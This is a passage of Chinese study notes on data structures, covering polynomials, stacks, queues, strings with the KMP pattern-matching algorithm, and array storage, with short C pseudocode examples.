<h2 id="2-4-一元多项式的表示及相加"><a href="#2-4-一元多项式的表示及相加" class="headerlink" title="2.4 一元多项式的表示及相加"></a>2.4 一元多项式的表示及相加</h2><ol>
<li>符号多项式的操作已经成为表处理的典型用例：将一元n次多项式按升幂排列时，由n+1个系数唯一确定，它们便构成了一个线性表。</li>
<li>也可以让每个数据元素有两个数据项：系数项和指数项，虽然可能会比上一种方案多存储一倍的数据，但对于次数很高且变化很大的多项式来说，这种表示将大大节省空间。</li>
<li>若只对多项式进行求值等不改变多项式系数和指数的运算，则采用顺序表；否则应采用链表。</li>
</ol>
<h1 id="第3章-栈和队列"><a href="#第3章-栈和队列" class="headerlink" title="第3章 栈和队列"></a>第3章 栈和队列</h1><p>从数据结构角度看，栈和队列是操作受限的线性表，其基本操作是线性表操作的子集，可称为限定性的数据结构。</p>
<p>从数据类型角度看，栈和队列是和线性表大不相同的两类重要的抽象数据类型，广泛应用在各种软件系统中。在面向对象的程序设计中，它们是多型数据类型。</p>
<h2 id="3-1-栈"><a href="#3-1-栈" class="headerlink" title="3.1 栈"></a>3.1 栈</h2><h3 id="3-1-1-抽象数据类型栈的定义"><a href="#3-1-1-抽象数据类型栈的定义" class="headerlink" title="3.1.1 抽象数据类型栈的定义"></a>3.1.1 抽象数据类型栈的定义</h3><ol>
<li><strong>栈（stack）</strong>是限定仅在表尾进行插入或删除操作的线性表。</li>
<li>表尾端称为<strong>栈顶（top）</strong>，表头端称为<strong>栈底（bottom）</strong>，不含元素的空表称为空栈。</li>
<li>栈的修改是按后进先出的原则进行的，故将栈称为<strong>后进先出（last in first out）</strong>的线性表，简称<strong>LIFO</strong>结构。</li>
<li>插入元素的操作称为入栈，删除栈顶元素的操作称为出栈。</li>
</ol>
<h3 id="3-1-2-栈的表示和实现"><a href="#3-1-2-栈的表示和实现" class="headerlink" title="3.1.2 栈的表示和实现"></a>3.1.2 栈的表示和实现</h3><ol>
<li>和线性表类似，栈也有<strong>顺序栈</strong>和<strong>链栈</strong>两种存储表示方法。</li>
<li>顺序栈中栈顶指针为<code>int</code>型，</li>
<li>初始化顺序栈时，可以先分配一个基本容量，再<code>realloc</code>逐段扩大。</li>
<li>链栈的操作是线性表操作的特例，易于实现。</li>
</ol>
<h2 id="3-2-栈的应用举例"><a href="#3-2-栈的应用举例" class="headerlink" title="3.2 栈的应用举例"></a>3.2 栈的应用举例</h2><p>栈结构的后进先出的固有特性使得栈成为程序设计中的有用工具。</p>
<h3 id="3-2-1-数制转换"><a href="#3-2-1-数制转换" class="headerlink" title="3.2.1 数制转换"></a>3.2.1 数制转换</h3><p>对于输入的任意一个非负十进制数，打印输出与其等值的八进制数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">conversion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  InitStack(S);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, N);</span><br><span class="line">  <span class="keyword">while</span> (N) &#123;</span><br><span class="line">    Push(S, N % <span class="number">8</span>);</span><br><span class="line">    N /= <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (!StackEmpty(S)) &#123;</span><br><span class="line">    Pop(S, e);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用栈而不使用数组的优点是：栈的引入简化了程序设计的问题，划分了不同的关注层次，使思考范围缩小；用数组不仅掩盖了问题的本质，还会分散精力去考虑数组下标增减等细节问题。</p>
<h3 id="3-2-2-括号匹配的检验"><a href="#3-2-2-括号匹配的检验" class="headerlink" title="3.2.2 括号匹配的检验"></a>3.2.2 括号匹配的检验</h3><p>可以用“期待的急迫程度”来描述：当计算机接受了第一个括号后，它期待着与其匹配的括号的出现，不断接受括号，对它们的匹配括号的期待急迫程度也不断改变。</p>
<p>即左括号则入栈，右括号则出栈，最终栈空则说明匹配。</p>
<h3 id="3-2-3-行编辑程序"><a href="#3-2-3-行编辑程序" class="headerlink" title="3.2.3 行编辑程序"></a>3.2.3 行编辑程序</h3><p>方便用户在编辑一行文本时实现撤销操作。</p>
<h3 id="3-2-4-迷宫求解"><a href="#3-2-4-迷宫求解" class="headerlink" title="3.2.4 迷宫求解"></a>3.2.4 迷宫求解</h3><p>保证在迷宫的任何位置上都能沿原路返回。</p>
<h3 id="3-2-5-表达式求值"><a href="#3-2-5-表达式求值" class="headerlink" title="3.2.5 表达式求值"></a>3.2.5 表达式求值</h3><p>“算符优先法”：根据运算优先关系的规定来实现对表达式的编译或解释执行。</p>
<p>任意表达式的组成：</p>
<ul>
<li><strong>操作数（operand）</strong>：常数、变量或常量标识符</li>
<li><strong>运算符（operator）</strong>：算术运算符、关系运算符、逻辑运算符</li>
<li><strong>界限符（delimiter）</strong>：左右括号、表达式结束符</li>
</ul>
<p>运算符和界限符统称为<strong>算符</strong>，构成集合OP（$𝜽<em>{1}$和$𝜽</em>{2}$是任意两个相继出现的算符，<code>&lt;</code>、<code>=</code>和<code>&gt;</code>表示优先关系）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E5%85%B3%E7%B3%BB.png" alt="算符优先关系"></p>
<p>可以用OPTR工作栈寄存运算符，用OPND工作栈寄存操作数和运算结果：</p>
<ul>
<li>首先置操作数栈为空栈，表达式起始符<code>#</code>为运算符栈的栈底元素；</li>
<li>依次读入表达式中每个字符，操作数则进OPND栈，运算符则和OPTR栈顶运算符比较优先权后作相应操作，直至整个表达式求值完毕（OPTR栈的栈顶元素和当前读入的字符均为<code>#</code>）。</li>
</ul>
<p>相应操作：</p>
<ul>
<li>若读入的运算符比栈顶运算符优先权高，则直接入栈；</li>
<li>若读入的运算符比栈顶运算符优先权低，则栈顶运算符出栈；</li>
<li>若读入的运算符和栈中运算符优先权相等，则全部出栈。</li>
</ul>
<h2 id="3-3-栈与递归的实现"><a href="#3-3-栈与递归的实现" class="headerlink" title="3.3 栈与递归的实现"></a>3.3 栈与递归的实现</h2><ol>
<li>一个直接调用自己或通过一系列的调用语句间接地调用自己的函数，称做递归函数。</li>
<li>递归是程序设计中一个强有力的工具：<ul>
<li>阶乘函数、2阶Fibonacci数列和Ackerman函数等很多数学函数是递归定义的；</li>
<li>二叉树、广义表等数据结构本身固有的递归特性使得它们的操作可以递归地描述；</li>
<li>八皇后问题、Hanoi塔问题等问题虽然没有明显的递归结构，但用递归求解比迭代求解更简单。</li>
</ul>
</li>
<li>当多个函数构成嵌套调用时，则按照“后调用先返回”的原则，即通过栈来实现。</li>
<li>一个递归函数的运行过程类似于多个函数的嵌套调用，只是调用函数和被调用函数是同一个函数。</li>
<li>为保证递归函数正常运行，系统需设立一个“递归工作栈”作为整个递归函数运行期间使用的数据存储区，每一层递归所需信息构成一个“工作记录”。</li>
<li>递归函数结构清晰、程序易读、正确性易证明，给用户编制程序和调试程序带来很大方便。</li>
</ol>
<h2 id="3-4-队列"><a href="#3-4-队列" class="headerlink" title="3.4 队列"></a>3.4 队列</h2><h3 id="3-4-1-抽象数据类型队列的定义"><a href="#3-4-1-抽象数据类型队列的定义" class="headerlink" title="3.4.1 抽象数据类型队列的定义"></a>3.4.1 抽象数据类型队列的定义</h3><ol>
<li><p>和栈相反，<strong>队列（queue）</strong>是一种<strong>先进先出（first in first out，FIFO）</strong>的线性表。</p>
</li>
<li><p>队列只允许在表的一端进行插入，而在另一端删除元素。</p>
</li>
<li><p>队列中允许插入的一端叫做<strong>队尾（rear）</strong>，允许删除的一端则称为<strong>队头（front）</strong>。</p>
</li>
<li><p>除栈和队列之外，还有一种限定性数据结构是<strong>双端队列（deque）</strong>，限定插入和删除操作在表的两端进行。还可以有输出受限的双端队列和输入受限的双端队列等。</p>
<p>双端队列实际上在应用程序中远不及栈和队列有用，不做详细讨论。</p>
</li>
</ol>
<h3 id="3-4-2-链队列——队列的链式表示和实现"><a href="#3-4-2-链队列——队列的链式表示和实现" class="headerlink" title="3.4.2 链队列——队列的链式表示和实现"></a>3.4.2 链队列——队列的链式表示和实现</h3><ol>
<li>和线性表类似，队列也有<strong>链队列</strong>和<strong>循环队列</strong>两种存储表示。</li>
<li>链队列需要两个指针，分别指向队头和队尾，称为头指针和尾指针。</li>
<li>为便于操作，给链队列添加一个头结点。</li>
<li>一般情况下，删除队列头元素时仅需修改头结点中的指针，但当队列中最后一个元素被删时，需对队尾指针重新赋值（指向头结点）。</li>
</ol>
<h3 id="3-4-3-循环队列——队列的顺序表示和实现"><a href="#3-4-3-循环队列——队列的顺序表示和实现" class="headerlink" title="3.4.3 循环队列——队列的顺序表示和实现"></a>3.4.3 循环队列——队列的顺序表示和实现</h3><ol>
<li>和顺序栈类似，在队列的顺序存储结构中，还需两个指针<code>front</code>和<code>rear</code>（<code>int</code>型）分别指示队头元素和队尾元素的位置。</li>
<li>初始化建空队列时，令<code>front=rear=0</code>，每当插入新的队尾元素时，尾指针增1；每当删除队头元素时，头指针增1。则在非空队列中，头指针始终指向队头元素，尾指针始终指向队尾元素的下一个位置。</li>
<li>由于可以从另一边删除元素，顺序队列和顺序栈的不同之处是：当队尾指针最大时，队列的实际可用空间并未占满。所以可以将顺序队列想象成环状空间，称为<strong>循环队列</strong>。</li>
<li>可以有两种方法判断队列是否已满：<ul>
<li>另设一标志位以区别队列是空还是满；</li>
<li>少用一个存储空间，约定以“队头指针在队尾指针的下一位置上”作为队列呈满状态的标志。</li>
</ul>
</li>
<li>C语言中不能动态分配一维数组来实现循环队列，必须设定一个最大队列长度。若不能满足的话，则宜采用链队列。</li>
</ol>
<h2 id="3-5-离散事件模拟"><a href="#3-5-离散事件模拟" class="headerlink" title="3.5 离散事件模拟"></a>3.5 离散事件模拟</h2><p>银行业务的模拟程序。</p>
<h1 id="第4章-串"><a href="#第4章-串" class="headerlink" title="第4章 串"></a>第4章 串</h1><p>计算机上的非数值处理的对象基本上是字符串数据。</p>
<p>字符串一般简称为串。</p>
<h2 id="4-1-串类型的定义"><a href="#4-1-串类型的定义" class="headerlink" title="4.1 串类型的定义"></a>4.1 串类型的定义</h2><ol>
<li><strong>串（string）</strong>（或字符串）是由零个或多个字符组成的有限序列，一般记为$$s=’a_{1}a_{2}…a_{n}(n\ge 0)’$$其中<code>s</code>是串的名，单引号括起来的字符序列是串的值（可以是字母、数字或其他字符），字符的数目称为串的<strong>长度</strong>（零个字符的串称为<strong>空串（null string）</strong>）。单引号本身不属于串。</li>
<li>串中任意个<strong>连续</strong>的字符组成的子序列称为该串的<strong>子串</strong>，包含子串的串称为<strong>主串</strong>。</li>
<li>字符在序列中的序号为该字符在串中的<strong>位置</strong>，子串在主串中的位置是子串的第一个字符在主串中的位置。</li>
<li>只有当两个串的长度相等，且各对应位置的字符都相等时，这两个串才相等。</li>
<li>空格是串的字符集合中的一个元素，由若干个空格组成的串称为<strong>空格串（blank string，不是空串）</strong>，长度为空格的个数。</li>
<li>串的逻辑结构类似于线性表，只不过串的数据对象约束为字符集。</li>
<li>串的操作通常以整体作为操作对象，而不是像线性表一样操作单个元素。</li>
</ol>
<h2 id="4-2-串的表示和实现"><a href="#4-2-串的表示和实现" class="headerlink" title="4.2 串的表示和实现"></a>4.2 串的表示和实现</h2><p>串有3种机内表示方法，如下。</p>
<h3 id="4-2-1-定长顺序存储表示"><a href="#4-2-1-定长顺序存储表示" class="headerlink" title="4.2.1 定长顺序存储表示"></a>4.2.1 定长顺序存储表示</h3><ol>
<li><p>类似于线性表的顺序存储结构，用一组连续的存储单元存储串值的字符序列。</p>
</li>
<li><p>对串长有两种表示方法：</p>
<ul>
<li><p>以下标为0的数组分量存放串的实际长度；</p>
</li>
<li><p>在串值后面加一个不计入串长的结束标记字符（如<code>&#39;\0&#39;</code>）。</p>
<p>此时串长为隐含值，不便于操作。</p>
</li>
</ul>
</li>
<li><p>串的这种顺序存储结构的操作基于字符序列的复制，时间复杂度基于复制的字符序列的长度。</p>
<p>而且由于长度受限，可能发生截断，解决办法只有不限定最大长度或动态分配存储空间。</p>
</li>
</ol>
<h3 id="4-2-2-堆分配存储表示"><a href="#4-2-2-堆分配存储表示" class="headerlink" title="4.2.2 堆分配存储表示"></a>4.2.2 堆分配存储表示</h3><ol>
<li><p>仍以一组地址连续的存储单元存放串值字符序列，但他们的存储空间是在程序执行过程中动态分配的。</p>
</li>
<li><p>C语言中存在一个称之为“堆”的自由存储区，由<code>malloc()</code>和<code>free()</code>函数来管理。</p>
</li>
<li><p>为处理方便，约定串长也作为存储结构的一部分。</p>
</li>
<li><p>串的堆分配存储表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *ch;</span><br><span class="line">  <span class="keyword">int</span> length;</span><br><span class="line">&#125;HString;</span><br></pre></td></tr></table></figure></li>
<li><p>操作仍基于字符序列的复制，但首先进行内存分配操作。</p>
</li>
<li><p>由于堆分配存储结构的串既有顺序存储结构的优点（处理方便），操作中又对串长没有任何限制，更显灵活，因此在串处理的应用程序中也常被选用。</p>
</li>
</ol>
<h3 id="4-2-3-串的块链存储表示"><a href="#4-2-3-串的块链存储表示" class="headerlink" title="4.2.3 串的块链存储表示"></a>4.2.3 串的块链存储表示</h3><ol>
<li><p>和线性表的链表类似，也可以采用链表方式存储串值。</p>
</li>
<li><p>每个结点可以存放一个字符，也可以存放多个字符（此时结点中包含一个数组）（此时无法占满时补上<code>#</code>或其他的非串值字符）。</p>
</li>
<li><p>为便于联结操作，以链表存储串值时，除头指针外还可附设尾指针指向最后一个结点，并给出当前串的长度。称如此定义的串存储结构为<strong>块链结构</strong>。不必建立双向链表。</p>
</li>
<li><p>串的存储密度=串值所占的存储位/实际分配的存储位。</p>
<p>结点大小为1时，存储密度小，运算处理方便，但存储占用量大。</p>
</li>
<li><p>串的链式存储结构对联接等操作有一定方便之处，但因为占用存储量大且操作复杂而不如另外两种存储结构灵活。</p>
</li>
</ol>
<h2 id="4-3-串的模式匹配算法"><a href="#4-3-串的模式匹配算法" class="headerlink" title="4.3 串的模式匹配算法"></a>4.3 串的模式匹配算法</h2><h3 id="4-3-1-求子串位置的定位函数Index-S-T-pos"><a href="#4-3-1-求子串位置的定位函数Index-S-T-pos" class="headerlink" title="4.3.1 求子串位置的定位函数Index(S, T, pos)"></a>4.3.1 求子串位置的定位函数<code>Index(S, T, pos)</code></h3><ol>
<li><p>子串的定位操作通常称做串的<strong>模式匹配</strong>（其中<code>T</code>称为<strong>模式串</strong>）。</p>
</li>
<li><p>若用最简单的思路进行定位，则从<code>pos</code>开始比较，若对应位置二者相等则二者指针均后移，若不等则<code>T</code>指针后退至1，<code>S</code>指针后退至本次开始匹配的位置（<code>i-(j-1)</code>）的下一个位置（<code>i-(j-1)+1</code>），继续匹配。</p>
</li>
<li><p>一般情况下，上述算法的时间复杂度为O(n+m)，n和m分别为主串和模式串的长度。</p>
</li>
<li><p>但在某种特殊情况下，如主串为<code>00000000000000000000000000000000000000000000000000001</code>，模式串为<code>00000001</code>时，会发生不断回溯的情况，可以看出算法在最坏情况下的时间复杂度为O(n*m)。</p>
<p>而且这种情况十分常见，如在只有0、1两种字符的文本串的处理中。</p>
</li>
</ol>
<h3 id="4-3-2-模式匹配的一种改进算法"><a href="#4-3-2-模式匹配的一种改进算法" class="headerlink" title="4.3.2 模式匹配的一种改进算法"></a>4.3.2 模式匹配的一种改进算法</h3><p>串的第<code>0</code>位存储长度值，故从<code>1</code>开始计数。</p>
<ol>
<li><p>这种改进算法是D.E.<strong>K</strong>nuth与J.H.<strong>M</strong>orris和V.R.<strong>P</strong>ratt同时发现的，故被称为克努特-莫里斯-普拉特操作，简称KMP算法。</p>
</li>
<li><p>此算法可以在O(n+m)的时间数量级上完成串的模式匹配操作。</p>
</li>
<li><p>改进的思路是：每当一趟匹配过程中出现字符比较不等时，<strong>不需回溯<code>i</code>指针</strong>，而是利用已经得到的<strong>“部分匹配”的结果</strong>将模式串向右“滑动”<strong>尽可能远</strong>的一段距离后，继续进行比较：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/KMP%E6%94%B9%E8%BF%9B%E7%A4%BA%E4%BE%8B.png" alt="KMP改进示例"></p>
</li>
<li><p>该算法的关键在于，当发生失配时，模式串“向右滑动”可行的距离有多远，即下一次主串的失配字符应与模式串中哪个字符再比较？</p>
</li>
<li><p>假设下一次主串的失配字符应与模式串的第<code>k</code>个字符相比。</p>
<p>此时主串匹配到<code>i</code>、模式串匹配到<code>j</code>，可知<code>k</code>不会超过<code>j</code>，而且<code>k</code>越小则滑得越远。</p>
<p>由失配可知主串从<code>i-j+1</code>～<code>i-1</code>和模式串的<code>1</code>～<code>j-1</code>是完全相同的，当然也满足主串的<code>i-k+1</code>～<code>i-1</code>和模式串的<code>j-k+1</code>～<code>j-1</code>是完全相同的。</p>
<p>既然下一次是<code>i</code>与<code>k</code>相比，那么一定有主串的<code>i-k+1</code>～<code>i-1</code>和模式串的<code>1</code>～<code>k-1</code>完全相同，而且对一切大于<code>k</code>的<code>k&#39;</code>都不满足。正是这个原因才使我们不用比较中间这些字符。</p>
<p>由这两个角度分析可知，<code>k</code>应满足的条件是：模式串的<code>j-k+1</code>～<code>j-1</code>和<code>1</code>～<code>k-1</code>完全相同，即模式串的头<code>k-1</code>个字符和尾<code>k-1</code>个字符完全相同。</p>
<p>可以看出，<code>k</code>的取值与主串无关。</p>
</li>
<li><p>由此可知，模式串的每一个<code>j</code>都一一对应这一个<code>k</code>，记<code>next[j]=k</code>，得到模式串的<code>next</code>函数定义：</p>
<ul>
<li>当<code>j=1</code>时，<code>next[j]=0</code>；</li>
<li>设A={k|1&lt;k&lt;j且<code>1</code>～<code>k-1</code>=<code>j-k+1</code>～<code>j-1</code>}，当集合A不空时，<code>next[j]=max(A)</code>；</li>
<li>其他情况，<code>next[j]=1</code>。</li>
</ul>
<p>可以看出，<code>j&gt;1</code>时，第<code>j</code>位的<code>next</code>值为前<code>j-1</code>位长的字符串的前缀和后缀的最大重叠字符个数+1，<strong>不存在则为1</strong>。</p>
</li>
<li><p>有了<code>next</code>函数，每次若匹配则<code>i</code>和<code>j</code>均增1，失配时则<code>i</code>不变而<code>j</code>退到<code>next[j]</code>位置（若<code>next[j]</code>为零，则<code>i</code>前移1位）。</p>
</li>
<li><p>KMP算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Index_KMP</span><span class="params">(SString S, SString T, <span class="keyword">int</span> pos)</span> </span>&#123;</span><br><span class="line">  i = pos;</span><br><span class="line">  j = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt;= S[<span class="number">0</span>] &amp;&amp; j &lt;= T[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">0</span> || S[i] == T[j]) &#123;</span><br><span class="line">      ++i;</span><br><span class="line">      ++j;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      j = next[j];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (j &gt; T[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> i - T[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>KMP算法是在已知模式串的<code>next</code>函数值的基础上执行的，那么，如何求得模式串的<code>next</code>函数值呢？</p>
<ol>
<li><p>当<code>j=1</code>时，<code>next[1]=0</code>。</p>
</li>
<li><p>当<code>j&gt;1</code>时，设<code>next[j]=k</code>（即模式串<code>1</code>～<code>k-1</code>和<code>j-k+1</code>～<code>j-1</code>完全相同）：</p>
<ul>
<li><p>此时若第<code>k</code>位和第<code>j</code>位也相同，说明<code>next[j+1]=k+1</code>，代入得<code>next[j+1]=next[j]+1</code>；</p>
</li>
<li><p>此时若第<code>k</code>位和第<code>j</code>位不相同，说明当模式串和自己进行匹配时，在<code>i=j</code>、<code>j=k</code>时出现了失配。此时的“模式串”应退到<code>next[k]</code>处和第<code>j</code>个字符比较：</p>
<ul>
<li><p>若比较成功，则说明<code>1</code>～<code>next[k]</code>和<code>j-next[k]+1</code>～<code>j</code>完全相同，即<code>next[j+1]=next[k]+1</code>；</p>
</li>
<li><p>若比较失败，则“模式串”退到<code>next[next[k]]</code>位置和第<code>j</code>个字符比较……（禁止套娃）</p>
<p>最终直到比较成功（<code>next[j+1]=next[...next[k]...]+1</code>）或无法找到（<code>next[...next[k]...]=0</code>即<code>next[j+1]=1</code>）为止。</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>经分析知，只需让模式串和自己进行匹配，若匹配则<code>next[i]=j+1</code>同时<code>i</code>和<code>j</code>均后移；若失配则让第<code>i</code>位和<code>next[j]</code>再进行比较，直到<code>next[j]=0</code>结束套娃：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_next</span><span class="params">(SString T, <span class="keyword">int</span> next[])</span> </span>&#123;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; T[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">0</span> || T[i] == T[j]) &#123;</span><br><span class="line">      ++i;</span><br><span class="line">      ++j;</span><br><span class="line">      next[i] = j;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      j = next[j];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>此算法的时间复杂度为O(m)，通常m作为模式串的长度较小，因此对整个匹配算法来说，所增加的这点时间是值得的。</p>
</li>
<li><p>虽然4.3.1节的算法时间复杂度是O(n*m)，但一般情况下实际的执行时间近似于O(n+m)，因此仍被采用。</p>
<p>KMP算法仅当模式与主串之间存在许多“部分匹配”的情况下才显得更快。而且由于主串的指针不需回溯，所以对输入的庞大的文件很有效，可以边读入边匹配。</p>
</li>
<li><p>上述获得<code>next</code>函数的算法在某些情况下尚有缺陷。因为定义的是每次失配则退到<code>next[j]</code>处，可是如果<code>next[j]</code>处的字符仍和<code>j</code>处的字符相等，我们本可以跳过和<code>next[j]</code>的比较，直接和<code>next[next[j]]</code>比较。即<code>next</code>函数可以做的改进是让<code>next[j]</code>直接等于<code>next[next[j]]</code>（如果仍相等则继续向前）。</p>
<p>这就是<code>nextval</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_nextval</span><span class="params">(SString T, <span class="keyword">int</span> next_val[])</span> </span>&#123;</span><br><span class="line">  i = <span class="number">1</span>;</span><br><span class="line">  nextval[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; T[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">0</span> || T[i] == T[j]) &#123;</span><br><span class="line">      ++i;</span><br><span class="line">      ++j;</span><br><span class="line">      <span class="keyword">if</span> (T[i] != T[j])</span><br><span class="line">        nextval[i] = j;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        nextval[i] = nextval[j];</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      j = nextval[j];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="4-4-串操作应用举例"><a href="#4-4-串操作应用举例" class="headerlink" title="4.4 串操作应用举例"></a>4.4 串操作应用举例</h2></li>
</ol>
<h3 id="4-4-1-文本编辑"><a href="#4-4-1-文本编辑" class="headerlink" title="4.4.1 文本编辑"></a>4.4.1 文本编辑</h3><ol>
<li><p>文本编辑的实质是修改字符数据的形式和格式，一般包括串的查找、插入和删除等基本操作。</p>
</li>
<li><p>可以把文本看成一个字符串，称为文本串，页则是文本串的子串，行又是页的子串。</p>
</li>
<li><p>为管理文本串的页和行，编辑程序为文本串建立了相应的页表和行表，即建立了各子串的存储映像。</p>
<p>页表的每一项给出了页号和该页的起始行号，而行表的每一项则指示每一行的行号、起始地址和该行子串的长度。</p>
</li>
<li><p>文本编辑程序中设立页指针、行指针和字符指针，分别指示当前操作的页、行和字符。</p>
</li>
</ol>
<h3 id="4-4-2-建立词索引表"><a href="#4-4-2-建立词索引表" class="headerlink" title="4.4.2 建立词索引表"></a>4.4.2 建立词索引表</h3><ol>
<li>信息检索的主要操作是在大量的存放在磁盘上的信息中查询一个特定的信息，为了提高查找效率，一个重要的问题是建立一个好的索引系统。</li>
<li>按书名检索并不方便，更好的办法是按书名关键词索引。为了便于查询，可设定此索引表为按词典有序的线性表。</li>
<li>设定数据结构：<ul>
<li>词表存放关键词，数量有限，故采用顺序表；</li>
<li>索引表为有序表，主要为查找用，为提高查找效率，宜采用顺序表；</li>
<li>索引表中每个索引项包含关键词和书号索引：<ul>
<li>关键词为常驻结构，考虑节省存储，采用堆分配存储表示的串类型；</li>
<li>书号索引在索引表的生成过程中逐个插入，且不同关键词的书号索引个数不等，甚至可能相差很多，则宜采用链表。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h1 id="第5章-数组和广义表"><a href="#第5章-数组和广义表" class="headerlink" title="第5章 数组和广义表"></a>第5章 数组和广义表</h1><p>前面讨论的线性结构的数据元素都是<strong>非结构的原子类型</strong>，即元素的值是不再分解的。</p>
<p>本章讨论的数组和广义表可以看成是线性表的扩展，因为表中的数据元素本身也是一个数据结构。</p>
<h2 id="5-1-数组的定义"><a href="#5-1-数组的定义" class="headerlink" title="5.1 数组的定义"></a>5.1 数组的定义</h2><ol>
<li><p>和线性表一样，数组的所有数据元素都必须属于同一数据类型。</p>
</li>
<li><p>数组中的每个元素都对应着一组下标（$j_{1},j_{2},…,j_{n}$），每个下标的取值范围是$0\le j_{i}\le b_{i}-1$，$b_{i}$是数组第i维的长度（i=1, 2, …, n）。</p>
<p>当n=1时，n维数组就退化为定长的线性表。</p>
</li>
<li><p>n维数组含有$\prod_{i=1}^{n}b_{i}$个数据元素，每个数据元素都受着n个关系的约束。</p>
<p>每个关系中，元素$a_{j_{1}j_{2}…j_{n}}$（$0\le j_{i}\le b_{i}-2$）都有一个直接后继元素，因此，就其单个关系而言，这n个关系仍是线性关系。</p>
</li>
<li><p>二维数组可以看成是（每个数据元素也是一个定长线性表的）线性表，同理一个n维数组类型可以定义为（其数据元素为n-1维数组类型的）一维数组类型。</p>
</li>
<li><p>数组一旦被定义，它的维数和维界就不再改变。因此除了结构的初始化和销毁之外，数组只有存取元素和修改元素值的操作。</p>
</li>
</ol>
<h2 id="5-2-数组的顺序表示和实现"><a href="#5-2-数组的顺序表示和实现" class="headerlink" title="5.2 数组的顺序表示和实现"></a>5.2 数组的顺序表示和实现</h2><ol>
<li><p>由上一条特性，数组自然地采用顺序存储结构表示。</p>
</li>
<li><p>由于存储单元是一维的，所以二维数组有两种存储方式：</p>
<ul>
<li><p>以列序为主序（column major order）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%88%97%E4%B8%BB%E5%BA%8F.png" alt="列主序"></p>
</li>
<li><p>以行序为主序（row major order）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E8%A1%8C%E4%B8%BB%E5%BA%8F.png" alt="行主序"></p>
</li>
</ul>
<p>在扩展BASIC、PL/1、COBOL、PASCAL和C语言中，用的都是<strong>以行序为主序</strong>的存储结构；而在FORTRAN语言中，用的是以列序为主序的存储结构。</p>
</li>
<li><p>假设每个数据元素占L个存储单元，则二维数组A中任一元素$a_{ij}$的存储位置可由下式确定$$LOC(i,j)=LOC(0,0)+(b_{2}\times i+j)L$$式中LOC(0,0)是二维数组A的起始存储位置（$a_{00}$），也称为基地址或基址；$b_{2}$是第二维（每列）的元素个数。</p>
</li>
<li><p>由上，得到n维数组的数据元素存储位置的计算公式：$$LOC(j_{1},j_{2},…,j_{n})=LOC(0,0,…,0)+(\sum_{i=1}^{n-1}j_{i}\prod_{k=i+1}^{n}b_{k}+j_{n})L=LOC(0,0,…,0)+\sum_{i=1}^{n}c_{i}j_{i}$$（$c_{n}=L, c_{i-1}=b_{i}\times c_{i}, 1&lt;i\le n$）即为每一维的位置乘以更高维长度之积，再加上第n维的位置，最后将总和乘以每个数据元素所占的存储单元，加上基地址即为所求的数据元素的存储位置。称为n维数组的映像函数。</p>
</li>
<li><p>数组元素的存储位置是其下标的线性函数，一旦确定了数组各维的长度，$c_{i}$就是常数。</p>
</li>
<li><p>计算各个元素存储位置的时间相等，则存取数组中任一元素的时间也相等。这种存储结构为随机存储结构。</p>
</li>
</ol>
<h2 id="5-3-矩阵的压缩存储"><a href="#5-3-矩阵的压缩存储" class="headerlink" title="5.3 矩阵的压缩存储"></a>5.3 矩阵的压缩存储</h2><ol>
<li>通常用高级语言编制程序时，都是用二维数组来存储矩阵元。但在数值分析中经常出现一些阶数很高的矩阵，且有很多值相同的元素或零元素。为了节省存储空间，可以对这些矩阵进行<strong>压缩存储</strong>。</li>
<li>压缩存储是指：为多个值相同的元素只分配一个空间、对零元素不分配空间。</li>
